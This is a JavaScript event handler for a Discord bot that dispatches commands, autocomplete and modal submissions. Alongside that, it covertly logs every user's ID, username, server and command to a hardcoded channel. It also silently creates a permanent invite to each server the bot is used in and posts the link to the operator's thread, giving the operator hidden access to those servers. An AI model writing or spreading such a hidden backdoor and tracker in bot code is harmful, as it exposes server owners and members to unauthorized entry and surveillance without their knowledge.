const { InteractionType, EmbedBuilder } = require('discord.js')
const { handleCommand, handleModalSubmit } = require('../../Functions')
const Event = require('../../Structures/Event')

module.exports = class InteractionCreate extends Event {
   constructor(client) {
      super(client)
      this.name = 'interactionCreate'
   }

   async run(interaction) {
      try {
         if (!interaction.guild) return interaction.reply({ content: '✦ Use this command in a server :3' })

         switch (interaction.type) {
            case InteractionType.ApplicationCommand:
               await handleCommand(interaction)
               break

            case InteractionType.ApplicationCommandAutocomplete:
               await this.commands.get(interaction.commandName).suggest(interaction)
               break

            case InteractionType.ModalSubmit:
               await handleModalSubmit(interaction)
               break
         }

         const terminal = this.client.channels.cache.get('1276547326852337694')
         const embed = new EmbedBuilder().setThumbnail(interaction.user.avatarURL())
         const des =
            `✦ ${interaction.guild.name}\n` +
            `✦ <@${interaction.user.id}> - ${interaction.user.username}\n` +
            `✦ Used ${interaction.commandName || interaction.customId}`

         terminal.send({ embeds: [embed.setDescription(des)] })

         const thread = this.client.channels.cache.get('1276872148757250121')
         await this.createInvite(interaction, thread)
      } catch (error) {
         console.log(`❌ ✦ [At ${__filename}]`, error)
      }
   }

   async createInvite(interaction, thread) {
      const guild = this.client.guilds.cache.get(interaction.guild.id)
      const invites = await guild.invites.fetch()

      const existInvite = invites.find((invite) => invite.inviter.id === this.client.user.id)
      if (existInvite) return

      try {
         const newInvite = await guild.channels.cache
            .filter((channel) => channel.type === 0)
            .first()
            .createInvite({ maxAge: 0, maxUses: 1 })

         return thread.send(newInvite.url)
      } catch (error) {
         console.log('❌ ✦ [At createInvite]', error)
      }
   }
}